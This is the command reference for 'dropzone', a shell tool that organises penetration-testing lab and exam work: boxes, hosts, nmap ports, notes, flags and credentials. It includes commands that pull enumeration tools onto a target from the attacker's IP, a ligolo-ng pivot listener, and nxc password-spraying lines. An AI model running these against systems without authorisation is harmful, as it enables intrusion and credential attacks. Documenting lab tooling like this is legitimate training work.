# Commands

[README](../README.md) · [Guide](guide.md) · **Commands** · [Notes](notes.md) · [Config](config.md) · [Errors](errors.md) · [Testing](testing.md) · [Development](development.md)

Everything runs through `dz`. Without options it opens the menu; with options it runs the action straight away. New to dz? Read the [guide](guide.md) first. When something goes wrong, dz shows a code like `dz [E201] no box loaded`: `dz --explain E201` or [errors.md](errors.md) says why.

- [Overview](#overview)
- [New box](#new-box)
- [Change IP](#change-ip)
- [Load, view, info, unload](#load-view-info-unload)
- [More hosts in a box](#more-hosts-in-a-box)
- [Ports from nmap](#ports-from-nmap)
- [Serve files](#serve-files)
- [Copy to the clipboard](#copy-to-the-clipboard)
- [Done, archive, open note](#done-archive-open-note)
- [Flags, timeline, screenshots](#flags-timeline-screenshots)
- [Command output as evidence](#command-output-as-evidence)
- [Search the notes](#search-the-notes)
- [Creds](#creds)
- [Deadline](#deadline)
- [SysReptor](#sysreptor)
- [Remove](#remove)
- [Menu](#menu)
- [VPN check](#vpn-check)
- [Variables](#variables)
- [Config](#config)
- [Update](#update)

## Overview

| Option | Does |
|---|---|
| `-n <name>` | new box (needs `-ip`) |
| `--template <name>` | with `-n`: another note template, like `exam` |
| `--deadline [when]` | time limit of the box (`10d`, `48h`, a date), shown in `dz -i` and the prompt |
| `-ip <ip>` | target IP; without `-n` it changes the IP |
| `-h <host,...>` | hostnames, added to `/etc/hosts`; without `-n` it changes them, `none` clears them |
| `-l <name>` | load a box |
| `-v` | view all boxes, `--all` includes the archive |
| `-i` | show the loaded box |
| `-x` | unload the box |
| `-p [file]` | open ports from your own nmap output into the note |
| `serve [smb] [dir] [port]` | HTTP server (or SMB share) with download commands that have your IP in them |
| `serve [dir] [port] --via <host>` | the same for a host behind a pivot: the ligolo listener to add, and the pivot's IP in the commands |
| `-cp [what]` | copy the target IP, a host, your IP or a cred to the clipboard |
| `-t [host]` | hosts in the box: list them, or make `<host>` the target |
| `-t <host> -ip <ip> [-h ...]` | add or change a host; `--drop` removes it |
| `-t <host> --via <pivot>` | the host sits behind that pivot; `--via none` clears it |
| `-o [name]` | open the note (editor, or Obsidian with `notes = vault`) |
| `-d [name]` | mark a box done |
| `-a <name>` | archive a box |
| `-f [user\|root] [flag]` | store a flag in the note (root flag = done), or show the flags |
| `-f <host> <flag>` | store the flag of a host in the box, counted against `flag_goal` |
| `-j [text]` | add a line to the note's timeline, or show it |
| `-s [caption]` | screenshot to `evidence/`, embedded in the timeline |
| `<cmd> \| dz -e [caption]` | command output to `evidence/`, with the command, as a code block in the timeline |
| `-g <term> [--all]` | search the notes of every box, `--all` includes the archive |
| `-c [user[:secret]] [source]` | store or list creds, opt-in (`creds = yes`) |
| `-c [nr] --valid <host,...>` | where a cred works, into the list and the note |
| `-c --export` | users, passwords and NT hashes to `loot/` for spraying |
| `-r <name>` | remove a box, also an archived one |
| `-y` | no confirmation (with `-r`) |
| `--note` | also trash the note (with `-r`) |
| `--keep-note` | keep the note (with `-r`) |
| `--config` | edit the config, applies after saving |
| `--config show` | values in use now |
| `--config check` | settings you don't have yet, after an update |
| `--update` | update dropzone; config, templates, boxes and notes stay |
| `--explain [code]` | what an error code means and what to do, see [errors.md](errors.md) |
| `--version` | version |
| `-h`, `--help` | help (`-h` without a value, `--help` anywhere) |

One action per call: `-n`, `-l`, `-v`, `-i`, `-x`, `-t`, `-p`, `-cp`, `-o`, `-d`, `-a`, `-f`, `-j`, `-s`, `-e`, `-g`, `-c` or `-r`. Tab completion knows every option and fills in box names after `-l`, `-r`, `-o`, `-d` and `-a` (archived ones too after `-l`, `-r`, `-o` and `-d`), host names after `-t`, `--valid` and `-f`, the choices after `-cp` and nmap files after `-p`.

## New box

```bash
dz -n <name> -ip <ip> [-h <host,...>]
```

| Example | Does |
|---|---|
| `dz -n jacops -ip 10.129.42.190` | folder, note and variables |
| `dz -n jacops -ip 10.129.42.190 -h jacops.htb` | also adds a line to `/etc/hosts` (asks for sudo) |
| `dz -n jacops -ip 10.129.42.190 -h dc01.jacops.htb,jacops.htb` | several hostnames on one line; `$DOMAIN` is the first |

What it sets up:

- `~/boxes/<name>/` with the folders from the config (default `scans/`, `loot/`, `exploits/`, `evidence/`, `logs/`), and `cd`s into it
- `~/boxes/<name>/.dropzone` with name, IP and hostnames. dz reads it line by line and never runs it, so files from a target (a dumped `.env`, unpacked loot) can't run code on your Kali
- a note from your template: `~/boxes/<name>/notes.md`, or `<vault>/Boxes/<name>.md` with `notes = vault`, see [notes.md](notes.md)
- an `/etc/hosts` line tagged `# dz:<name>`, after a backup to `/etc/hosts.dz.bak`
- one ping to the target, info only (`ping = no` in the config turns it off), and a warning when your VPN is down or the route to the target doesn't go through it (`vpncheck = no` turns that off)

### Another template

```bash
dz -n cpts -ip 10.129.5.10 --template exam --deadline 10d
```

`--template exam` uses `exam.md`, `exam-note.md` or `Exam-note.md` from `~/.config/dropzone/templates/`, then from the folder of your own `template` (your vault's `Templates/`, say), then the one that ships with dropzone (`templates/exam-note.md`). A name with a `/` or `.md` is a path, read like `template` in the config. The bundled exam note has Scope, a Hosts table with a *Via* column, Ports with a Host column, Credentials, Findings, Host notes (a `### <host>` heading per host you add), Timeline and a Flags section for flags per host. It only picks the note of a **new** box; an existing note is never replaced.

`dz -n` on a box that already exists updates its IP and keeps its hostnames, unless you give new ones.

## Change IP

```bash
dz -ip <ip>               # loaded box
dz -l <name> -ip <ip>     # another box
dz -h <host,...>          # only the hostnames of the loaded box
dz -h none                # remove its /etc/hosts line
```

- The old IP is replaced by the new one everywhere in the note, and `updated:` is set to today.
- Matching is exact: `10.10.10.1` leaves `10.10.10.15` alone.
- The `/etc/hosts` line for that box moves along. Add `-h <host,...>` to change the hostnames too.
- The note is never overwritten.

## Load, view, info, unload

| Command | Does |
|---|---|
| `dz -l jacops` | load a box and `cd` into its folder (with a warning when the VPN is down) |
| `dz -v` | view all boxes with IP, status and hostnames, `▶` marks the loaded one |
| `dz -v --all` | also the archived boxes |
| `dz -i` | box, target, hostnames, attacker IP, status, folder and note of the loaded box |
| `dz -x` | unload the box |

New terminals load the last box automatically. `$ATTACKER_IP` is read again before the prompt (at most every 10 seconds), so it follows a VPN reconnect.

## More hosts in a box

For an AD set, a pivot or a lab with several machines: the box keeps its own IP (the main host), and you add the others by name.

```bash
dz -t dc01 -ip 10.10.10.5 -h dc01.corp.local,corp.local   # add a host
dz -t ms01 -ip 10.10.10.6
dz -t                                                      # list them, ▶ = target
dz -t dc01                                                 # dc01 becomes the target
dz -t corp                                                 # back to the main host (the box name)
dz -t dc01 -ip 10.10.10.15                                 # new IP, hostnames stay
dz -t dc01 --drop                                          # remove it
```

| What | How it works |
|---|---|
| Variables | `$DC01_IP`, `$MS01_IP`: the host name in capitals, `-` becomes `_`. `$TARGETS` has every IP of the box, so `nxc smb $TARGETS` hits them all |
| Target | `$TARGET_IP`, `$TARGET` and `$DOMAIN` follow the active host; the prompt shows it: `[corp dc01 10.10.10.5]-`. New terminals keep it |
| `/etc/hosts` | a line per host with hostnames, tagged `# dz:<box>/<host>`. `dz -a` and `dz -r` remove every line of the box, `dz -l` on an archived box puts them back |
| Note | a row in the first table under `## Hosts`: the columns Host (or Name), IP and Hostname / FQDN are filled, without a Host column the name goes into a Role or Notes column. Plus a timeline line. A new IP is replaced in the note, exact match |
| Names | lowercase letters, digits and `-`, like `dc01` or `ms-02` |

### Hosts behind a pivot

```bash
dz -t web01 -ip 172.16.5.15                  # the pivot, its internal IP
dz -t ms01 -ip 172.16.5.10 --via web01       # ms01 sits behind web01
dz -t dc01 --via ms01                        # a double pivot, on a host you already have
dz -t dc01 --via none                        # no pivot
```

`dz -t` and `dz -i` show `via web01`, the *Via* (or *Pivot*) column of the Hosts table is filled, and a change gets a timeline line. `--via` alone never changes the target. Removing a host with `--drop` also clears it as the pivot of other hosts. The main host is the entry point, so it has no pivot. Stored in `~/boxes/<box>/.via`.

`dz -ip` and `dz -h` without `-t` always change the main host. `dz -i` and `dz -v` show the extra hosts.

## Ports from nmap

dropzone never scans. You run nmap yourself, and `dz -p` reads what it found:

```bash
nmap -p- -oA scans/all $TARGET_IP      # -oA writes .xml, .nmap and .gnmap
dz -p                                  # the newest .xml or .gnmap in scans/
dz -p scans/udp.gnmap                  # a given file
```

- Every **open** port becomes a row in the first table under `## Ports` (or `### Poorten`): port, protocol, service and version. The columns are matched by name (Port, Proto, State, Service, Version, Notes), so your own template works. Without a Proto column the port reads `22/tcp`.
- Rows that are already there stay as they are, notes included. Run it again after a second scan: only new ports are added.
- IPs are matched to the hosts of the box (`dz -t`), so one scan of a whole AD set lands under the right host. With more than one host the host name goes into the Host column, or the Notes column. Other IPs are skipped with a message.
- A timeline line says what was added.

## Serve files

```bash
dz serve                      # the current folder on port 80
dz serve ~/tools 8000         # a folder and a port
dz serve smb ~/tools          # an SMB share (impacket-smbserver)
```

It prints what to type on the target, with your `$ATTACKER_IP`, then starts the server (Ctrl-C stops it):

| | Linux | Windows |
|---|---|---|
| HTTP | `wget http://10.10.14.7/linpeas.sh -O /tmp/linpeas.sh` | `iwr http://10.10.14.7/winPEAS.exe -OutFile ...` |
| SMB | | `copy \\10.10.14.7\share\winPEAS.exe .` |

### Behind a pivot

A host in an internal network can't reach your VPN IP. With ligolo-ng you add a listener on the pivot that forwards a port to your server; `--via` prints that line and the download commands with the pivot's IP:

```bash
dz -t web01-int -ip 172.16.5.15      # the pivot's internal IP, once
dz serve ~/tools --via web01-int     # or --via 172.16.5.15
```

```
listener_add --addr 0.0.0.0:8000 --to 10.10.14.7:8000 --tcp
wget http://172.16.5.15:8000/linpeas.sh -O /tmp/linpeas.sh
```

Paste the `listener_add` line in the ligolo-ng proxy, on the session of the pivot. The port is 8000 unless you give one: a pivot without root can't listen below 1024. Use the pivot's **internal** IP, the one the target can reach. SMB doesn't go through a listener (Windows only talks SMB on 445, and the pivot uses that port itself), so `serve smb --via` is refused.

It listens on your VPN IP only, not on your other interfaces, so nobody on your LAN can read the folder. `dz serve exploits` serves a subfolder of the loaded box. A folder with box files in it (`creds`, `.dropzone`, `notes.md`), your boxes folder, the archive, any folder above them and your home folder are refused. A folder with the lists from `dz -c --export` (`users.txt`, `passwords.txt`, `hashes.txt`) gets a warning (`W604`), so `dz serve loot` doesn't hand out your creds by accident. If your VPN interface is down it tells you, instead of printing a wrong IP. Needs `python3`, and `impacket-smbserver` for SMB.

## Copy to the clipboard

```bash
dz -cp            # the target IP
dz -cp dc01       # a host in the box
dz -cp me         # your IP on the VPN
dz -cp pass       # the password of the active cred (not shown on screen)
```

Also `domain`, `targets`, `user` and `hash`. It uses `wl-copy`, `xclip` or `xsel`, whichever fits your session; tab completion lists the choices. Without a desktop session it prints the value, so `$(dz -cp dc01)` works in a command.

## Done, archive, open note

| Command | Does |
|---|---|
| `dz -d` / `dz -d jacops` | mark the loaded box (or `jacops`) done: `status: done` and `updated:` in the note |
| `dz -a jacops` | done, plus the folder moves to `~/boxes/_archive/jacops` and its `/etc/hosts` lines go; the note stays |
| `dz -l jacops` | on an archived box: moves it back and sets `status: active` |
| `dz -o` / `dz -o jacops` | open the note: in `$VISUAL` / `$EDITOR` or the desktop's default app; with `notes = vault` in Obsidian (`obsidian://` link). Without either it prints the path or link |

The status lives in the note's frontmatter (`status: active` / `status: done`), so Obsidian sees it too. `dz -v` reads it from there; `bezig` / `af` from older notes read as `active` / `done`.

## Flags, timeline, screenshots

All three write into the note of the loaded box, so your report grows while you work.

| Command | Does |
|---|---|
| `dz -f 3f9a...e1` | flag into the first empty slot under `## Flags` (user, then root) |
| `dz -f root 3f9a...e1` | into the root slot |
| `dz -f dc01 3f9a...e1` | the flag of host dc01 (a box with more hosts, or the exam template) |
| `dz -f` | show the flags, with a count against `flag_goal` |
| `dz -j found an NFS share with backups` | `- 2026-10-14 15:32 · found an NFS share with backups` in the timeline |
| `dz -j` | the last 10 timeline entries |
| `dz -s` / `dz -s smb share listing` | select a region; the PNG goes to `evidence/` and is embedded in the timeline |

- **Flags on a box with more hosts** (`dz -t`, an exam or an AD set), or in a note without user/root slots (like `--template exam`): every flag is a line `- 2026-10-18 14:30 · dc01 · <flag>` at the end of `## Flags`. `dz -f <flag>` stores it for the active host, `dz -f ms01 <flag>` for another one. `dz -f` lists them with a count; set `flag_goal = 14` in the config for the CPTS exam and it shows `9/14 flags`. A flag never marks such a box done, also not `dz -f root ...`: finish it yourself with `dz -d`. The same flag twice is refused.
- **Flags**: `- **User flag:**` lines (the bundled template) or Obsidian callouts (see [examples/obsidian](../examples/obsidian/)). A filled slot is never overwritten. A flag that isn't 32 hex gets a warning and is stored anyway. Every flag adds a timeline line, and the **root flag marks the box done**. `dz -f user|root <flag>` on a note without a `## Flags` section adds one with both slots.
- **Timeline**: a section `## Timeline` (config `timeline`), added right before `## Flags` when the note doesn't have it. `-j` takes the rest of the line, quotes are optional.
- **Screenshots**: saved as `evidence/<box>_<date>_<time>_<caption>.png` and embedded as `![caption](evidence/...)`. With `notes = vault` a copy goes to `Boxes/attachments/<box>/` (config `attachments`), because Obsidian only shows images inside the vault. With `notes = off` the screenshot is only saved. The tool is the first one found (config `screenshot`): on X11 `xfce4-screenshooter`, `flameshot`, `gnome-screenshot`, `spectacle` or `import`; on Wayland (sway, Hyprland, KDE, GNOME) `grim` with `slurp`, `spectacle`, `gnome-screenshot` or `flameshot`. Needs a desktop session; Esc cancels.
- A hotkey for screenshots: in Xfce, *Settings → Keyboard → Application Shortcuts*, command `zsh -ic 'dz -s'`. New shells load the last box, so it lands in the right note.

## Command output as evidence

Pipe a command into `dz -e` to keep its output for your report:

```bash
nxc smb $TARGETS --gen-relay-list relay.txt | dz -e smb signing off
```

- The output goes to `evidence/<box>_<date>_<time>_<caption>.txt`, colours stripped, with the command on top (`$ nxc smb ...`). The command comes from `commands.log`, so with `commands = no` the file has only the output.
- The timeline gets a line plus the first 30 lines as a code block; longer output says how many lines are only in the file.
- You still see nothing on screen; use `| tee /dev/tty | dz -e ...` to watch it too.

## Search the notes

```bash
dz -g <term> [--all]
```

Every line with the term, in any case, from the notes of all boxes, per box with its line number. For *where did I see that before?*: a service version, a user name, a technique from an earlier box. `--all` searches the archive too. The term is taken as it is, so `dz -g --via` looks for `--via`; quote a term with spaces: `dz -g 'smb signing'`.

```
[+] jacops  2
       41  - 2026-10-14 15:02 · kerberoast svc_sql, cracked with rockyou
       57  | svc_sql | kerberoast | ...
• 2 lines in 1 of 6 boxes
```

## Creds

Off by default. Turn it on with `creds = yes` in the config (`dz --config`).

| Command | Does |
|---|---|
| `dz -c alex NFS` | store a cred for the loaded box, with where you found it, and make it active; asks for the secret without echo |
| `dz -c 'alex:lol123!mD' NFS` | same, with the secret on the command line |
| `dz -c 'admin:31d6cfe0d16ae931b73c59d7e0c089c0'` | 32 hex characters (or `LM:NT`) is stored as an NT hash |
| `dz -c` | list the creds of the loaded box, `▶` marks the active one |
| `dz -c 2` | make cred #2 active |

- **Domain users**: `dz -c 'corp\svc_sql'` or `dz -c jdoe@corp.local` sets `$CRED_DOMAIN` (`corp`, `corp.local`) and `$TARGET_USER` without it, so `nxc smb $TARGETS -d $CRED_DOMAIN -u $TARGET_USER -p $PASSWORD` works. The cred is stored as you typed it.
- **Where it works**: `dz -c 2 --valid dc01,ms01` (or `dz -c --valid dc01` for the active cred, or `--valid` while storing) adds the hosts to the cred: `dz -c` shows `→ dc01, ms01`, and the *Valid on* column of its row in the note is filled. Hosts are names from `dz -t` or IPs; a name that isn't in the box gets a note, not an error.
- The active cred sets `$TARGET_USER` and either `$PASSWORD` or `$NT_HASH`. `$USER` is left alone, because that is your own login.
- **Keys and tickets**: a secret that is a file is stored with its full path. A private key sets `$SSH_KEY` (`dz -c 'root:loot/id_rsa'`, then `ssh -i $SSH_KEY root@$TARGET`), a `.ccache` sets `$KRB5CCNAME` (`dz -c 'administrator:loot/admin.ccache'`). dz only clears `$KRB5CCNAME` when it set it itself, so your own `export KRB5CCNAME=...` stays.
- **For spraying**: `dz -c --export` writes every user (without the domain), password and NT hash of the box to `loot/users.txt`, `loot/passwords.txt` and `loot/hashes.txt`, one per line and no doubles, for your own `nxc smb $TARGETS -u loot/users.txt -p loot/passwords.txt --continue-on-success`. It makes them again on every call; dz runs nothing against the target.
- Creds live in `~/boxes/<name>/creds` (only readable by you) and get a row in the *Credentials & secrets* table of the note.
- Everything after the first `:` is the secret, so passwords with `:` work. Quote secrets with `!` or spaces.
- `dz -c ...` and `dz --creds ...` are logged as `dz -c <hidden>` in `commands.log`. A secret on the command line is still in your zsh history; `dz -c <user>` keeps it out, or start the command with a space.
- Creds are plain text in the `creds` file, in the note and, after `dz -r`, in the trash. Fine for lab creds; know where your vault syncs to.

## Remove

```bash
dz -r <name> [-y] [--note | --keep-note]
```

| Example | Does |
|---|---|
| `dz -r jacops` | asks to confirm, then asks about the note (needs a terminal, otherwise add `-y`) |
| `dz -r jacops --note` | the note goes too |
| `dz -r jacops -y --keep-note` | no questions, the note stays |

| What | Where to |
|---|---|
| `~/boxes/<name>/` | system trash (`gio trash`), deleted if there is no trash |
| the note | `notes = folder`: along with the folder · `notes = vault`: `.trash/` in the vault, only if you choose so |
| `/etc/hosts` lines | removed, every host of the box |
| an archived box | removed the same way, from `_archive/` |
| loaded box | unloaded |

Only folders made by dropzone can be removed. Names must start with a letter or digit, so `.` and `..` are never a box.

## Menu

```bash
dz             # open the menu
DZ_ART=7 dz    # with a fixed banner art (1-10), just this once
```

<p align="center"><img src="../assets/menu.gif" alt="dropzone menu: new box form, box list, yes/no choice" width="85%"></p>

The status line under the banner shows the loaded box, the target (with the active host, `dz -t`), the time left with a deadline, and your VPN IP.

| Item | Does |
|---|---|
| New box | form for name, IP and hostnames |
| Load box | pick a box from the list, archived ones included |
| Target › | submenu for the target of the loaded box, see below |
| Notes › | submenu for the note of the loaded box, see below |
| Mark done | mark the loaded box done, optionally archive it |
| Remove box | pick a box, confirm, choose whether the note goes too |
| Unload box | unload the box |
| Quit | close the menu |

| Target › | Does | Same as |
|---|---|---|
| Change IP | new IP for the main host, old IP prefilled | `dz -ip <ip>` |
| Switch host | pick the main host or another host as the target | `dz -t <host>` |
| Add host | form for host, IP and hostnames | `dz -t <host> -ip <ip> -h ...` |
| Deadline | shows the deadline, sets a new one (`10d`, a date) or `none` | `dz --deadline <when>` |

| Notes › | Does | Same as |
|---|---|---|
| Open note | your editor, or Obsidian with `notes = vault` | `dz -o` |
| Timeline entry | a line in the timeline | `dz -j <text>` |
| Add flag | a flag for the active host (or the next free user/root slot) | `dz -f <flag>` |
| Creds | user and secret, the secret doesn't show while you type | `dz -c <user>` |

*Target ›*, *Notes ›*, *Mark done* and *Unload box* are greyed out when no box is loaded. *Switch host* needs a second host, the note items need notes, *Creds* needs `creds = yes` (with neither, *Notes ›* is greyed out). A box list longer than the screen scrolls.

| Key | Action |
|---|---|
| `↑` `↓` | move |
| `Enter` / `Space` | open |
| `1` – `9` | jump straight to an item |
| `q` / `Esc` | back, or close |
| `←` `→` / `Tab` | switch Yes / No |
| `y` / `n` | yes / no straight away |

Yes/no questions default to *No*. An empty field cancels the form. `q` in a submenu goes back to the main menu. Ports, screenshots, evidence, search and the tools are options (`dz --help`).

## Deadline

For an exam with a time limit (the CPTS exam has 10 days for the lab and the report):

| Command | Does |
|---|---|
| `dz --deadline 10d` | the time limit starts now: `10d`, `48h`, `9d12h` |
| `dz --deadline 2026-12-10T14:00` | until a date and time; a date alone means 23:59 |
| `dz --deadline` | `cpts: day 4/10 · 5d22h left (until 2026-12-10 14:00)` |
| `dz --deadline none` | remove it |
| `dz -n cpts -ip ... --deadline 10d` | together with a new box |

`dz -i` shows the same line, and the prompt shows what's left: `[cpts 10.129.5.10 5d22h]-`, red in the last 6 hours and `time's up` after. A new end keeps the start, so the day count stays right when you correct it. Stored in `~/boxes/<box>/.deadline`.

## SysReptor

Off by default. With `sysreptor = yes` in the config, `dz -s` screenshots and `dz -e` output also go to your [SysReptor](https://docs.sysreptor.com/) project, as notes under a note named after the box. It uses the [reptor](https://github.com/Syslifters/reptor) CLI:

```bash
pip install reptor
reptor conf            # server, API token and project
```

The upload runs in the background, so dz doesn't wait for it; `logs/sysreptor.log` has what reptor said. dropzone only sends evidence: findings and the report stay your work in SysReptor. Whatever is on a screenshot or in the output (passwords, hashes) goes along, so know where your SysReptor runs.

## VPN check

With `vpncheck = yes` (the default) dz checks your VPN when you make a box (`-n`), load one (`-l`), change an IP (`-ip`) or add a host (`-t`). It only warns, it never stops the command.

| Warning | Means |
|---|---|
| `• [W201] tun0 doesn't exist, is your VPN connected?` | the interface from `iface` is down: start your VPN, or set `iface` in the config ([W201](errors.md#w201)) |
| `• [W202] the route to 10.10.10.77 goes through eth0, not tun0` | your Kali would reach the target over another interface, so the target isn't in the VPN (wrong IP?), or another route wins ([W202](errors.md#w202)) |

A host behind a pivot is fine: a route through an interface from `pivot` (default `ligolo*`, so ligolo-ng's `ligolo` interface) gets no warning. Set `pivot = none` to warn about those too, or your own patterns, like `pivot = ligolo* tun1`. Needs `ip` (iproute2); `vpncheck = no` turns it off.

## Variables

Set when a box is loaded:

| Variable | Value |
|---|---|
| `$BOX` | box name |
| `$TARGET_IP` | target IP: the main host, or the active host with `dz -t` |
| `$DOMAIN` | first hostname, if given |
| `$TARGET` | same as `$TARGET_IP` |
| `$DC01_IP`, ... | every extra host (`dz -t`) |
| `$TARGETS` | the IPs of all hosts in the box, space separated |
| `$DZ_ACTIVE` | the active extra host, empty for the main host |
| `$ATTACKER_IP` | current IP of `iface` from the config (default `tun0`) |
| `$INTERFACE` | `iface` from the config |
| `$TARGET_USER` | active cred, with `creds = yes` |
| `$CRED_DOMAIN` | domain of the active cred (`corp\user`, `user@corp.local`), empty otherwise |
| `$SSH_KEY` / `$KRB5CCNAME` | key file or Kerberos ticket of the active cred |
| `$PASSWORD` / `$NT_HASH` | secret of the active cred |

`$TARGET`, `$DOMAIN`, `$ATTACKER_IP`, `$INTERFACE`, `$PASSWORD` and `$NT_HASH` match the names used by [The Hacker Recipes](https://thehacker.recipes/contributing/variables) and Exegol, so their commands paste straight in.

## Config

See **[config.md](config.md)** for every setting. Short version:

```bash
dz --config         # edit, applies after saving
dz --config show    # values in use now
```

## Update

```bash
dz --update
```

It runs `git pull --ff-only` in the dropzone folder and shows what changed, from the CHANGELOG:

```
• dropzone v1.1.0 → v1.2.0

### Added
- ...

• your config, templates, boxes and notes were not touched
• new settings? dz --config check · load the new version: exec zsh
```

Your config, templates, boxes and notes live outside the repo, so an update never touches them. Run `exec zsh` (or open a new terminal) to load the new version. It stops without changing anything when:

| Message | Fix |
|---|---|
| `dz [E702] there are local changes in ~/dropzone, ...` | you edited dropzone's own files: `git -C ~/dropzone stash`, or commit them |
| `dz [E701] ~/dropzone is not a git clone, ...` | you installed it another way: update it the same way |
| `dz [E703] git pull failed, ...` | no network, or your clone has its own commits so it can't fast-forward: see git's message above it |

`dz --update` says `up to date` when there's nothing new.

After an update, `dz --config check` lists the settings from the new `config.example` that aren't in your config yet (their default applies, add a line to change one), and under **Old forms** the lines that still work but have a new name, like `notes = Boxes`, which is now `notes = vault` + `vault_folder = Boxes`.
